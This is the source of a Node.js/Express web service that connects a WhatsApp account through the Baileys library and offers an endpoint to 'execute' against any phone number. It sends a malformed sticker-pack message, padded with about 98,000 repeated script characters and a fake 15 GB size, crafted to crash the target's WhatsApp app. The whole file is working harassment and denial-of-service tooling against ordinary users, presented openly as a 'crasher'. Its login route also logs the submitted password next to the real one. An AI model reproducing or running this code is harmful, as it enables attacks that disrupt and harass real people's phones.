const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

let sock = null;
let isConnected = false;
let pairCode = '';

// ==================== FUNGSI CRASH ====================
async function crashpack(sock, jid) {
    try {
        const proto = require('@whiskeysockets/baileys').proto;
        const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

        const messageContent = generateWAMessageFromContent(
            jid,
            proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        stickerPackMessage: {
                            stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
                            name: "akira crasher" + "ꦴꦿ".repeat(49000) + "°°".repeat(500),
                            publisher: "",
                            stickers: [
                                { fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp", isAnimated: false, emojis: [""] }
                            ],
                            fileLength: "8020935",
                            fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
                            fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
                            mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
                            directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc?ccb=11-4&oh=01_Q5Aa1wFfJ2yPLT287gHgeKwk1Ifh1jowuwT0trU3-hyqosIQoQ&oe=686EC6A7&_nc_sid=5e03e0",
                            contextInfo: {},
                            packDescription: "",
                            mediaKeyTimestamp: "1749506440",
                            trayIconFileName: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8.png",
                            thumbnailDirectPath: "/v/t62.15575-24/11293192_987589920117341_7624412198674010830_n.enc?ccb=11-4&oh=01_Q5Aa1wEsjICRK3G8YjlWAC0VhEhMrjAbUBenZphNNmjDSSXM7w&oe=686ED116&_nc_sid=5e03e0",
                            thumbnailSha256: "UOcoPZ0vEtKCLWiY4LjSjJXqBd93qjCI9cUXo70CCtY=",
                            thumbnailEncSha256: "A+BTqfSW5Cnt+tUwAHHcGPuppnk49pB72O3iz9jPeWg=",
                            thumbnailHeight: 252,
                            thumbnailWidth: 252,
                            imageDataHash: "ZGNiZTY2OWU1NDI1YzBjMmE0Y2ExODQ1Nzc5OWM3MGJlNDZmMzgzYTlhNDg1YzdhNDdjNTBlODI0YTc1YTVjZQ==",
                            stickerPackSize: "15000000000",
                            stickerPackOrigin: "USER_CREATED"
                        }
                    }
                }
            }),
            { userJid: jid }
        );

        await sock.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
        return { success: true };
    } catch (error) {
        console.error('🔥 CRASH ERROR:', error.message);
        return { success: false, error: error.message };
    }
}

// ==================== CONNECT WA ====================
async function connectWA() {
    try {
        console.log('🔄 Connecting to WhatsApp...');

        // Hapus auth_info kalo ada
        if (fs.existsSync('auth_info')) {
            fs.rmSync('auth_info', { recursive: true, force: true });
            console.log('🗑️ Auth folder deleted');
        }

        const { state, saveCreds } = await useMultiFileAuthState('auth_info');

        sock = makeWASocket({
            version: [2, 3000, 1015901307],
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: 'silent' }),
            browser: ['SysX-Forc', 'Chrome', '120.0.0.0']
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr) {
                console.log('📱 QR CODE GENERATED');
            }

            if (connection === 'open') {
                isConnected = true;
                console.log('✅ CONNECTED TO WHATSAPP!');
            }

            if (connection === 'close') {
                isConnected = false;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode === DisconnectReason.loggedOut) {
                    console.log('🚫 LOGGED OUT');
                    if (fs.existsSync('auth_info')) {
                        fs.rmSync('auth_info', { recursive: true, force: true });
                    }
                } else {
                    console.log('🔁 RECONNECTING...');
                    setTimeout(connectWA, 5000);
                }
            }
        });

        sock.ev.on('pairing-code', (code) => {
            pairCode = code;
            console.log(`📱 PAIR CODE: ${code}`);
        });

        return sock;
    } catch (error) {
        console.error('🔥 CONNECT ERROR:', error.message);
        setTimeout(connectWA, 5000);
        return null;
    }
}

// ==================== API ====================

// LOGIN
app.post('/api/login', (req, res) => {
    const { password } = req.body;
    console.log(`🔐 Login: ${password} vs ${process.env.PASSWORD}`);
    if (password === process.env.PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

// STATUS
app.get('/api/status', (req, res) => {
    res.json({
        connected: isConnected,
        pairCode: pairCode || null
    });
});

// PAIR - GENERATE PAIRING CODE
app.post('/api/pair', async (req, res) => {
    try {
        const { number } = req.body;
        if (!number) {
            return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi!' });
        }

        console.log(`📱 Pair request for: ${number}`);

        // PASTIKAN SOCKET AKTIF!
        if (!sock || !isConnected) {
            console.log('🔄 Socket not connected, reconnecting...');
            await connectWA();
            // Tunggu koneksi
            let wait = 0;
            while (!isConnected && wait < 10) {
                await new Promise(r => setTimeout(r, 1000));
                wait++;
            }
        }

        if (!sock || !isConnected) {
            return res.status(500).json({ success: false, error: 'Gagal konek ke WhatsApp' });
        }

        const code = await sock.requestPairingCode(number);
        pairCode = code;
        console.log(`✅ PAIR CODE: ${code}`);
        res.json({ success: true, pairCode: code });
    } catch (error) {
        console.error('🔥 PAIR ERROR:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// EXECUTE
app.post('/api/execute', async (req, res) => {
    try {
        const { target } = req.body;
        if (!target) {
            return res.status(400).json({ success: false, error: 'Target wajib diisi!' });
        }
        if (!sock || !isConnected) {
            return res.status(500).json({ success: false, error: 'WA belum connect!' });
        }
        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        const result = await crashpack(sock, jid);
        if (result.success) {
            res.json({ success: true, message: `✅ CRASH ke ${target}!` });
        } else {
            res.status(500).json({ success: false, error: result.error });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// LOGOUT
app.post('/api/logout', async (req, res) => {
    try {
        if (sock) await sock.logout();
        isConnected = false;
        sock = null;
        pairCode = '';
        if (fs.existsSync('auth_info')) {
            fs.rmSync('auth_info', { recursive: true, force: true });
        }
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ==================== START ====================
connectWA();

app.listen(PORT, () => {
    console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
    console.log(`👿 URL: https://brogia-production.up.railway.app`);
});
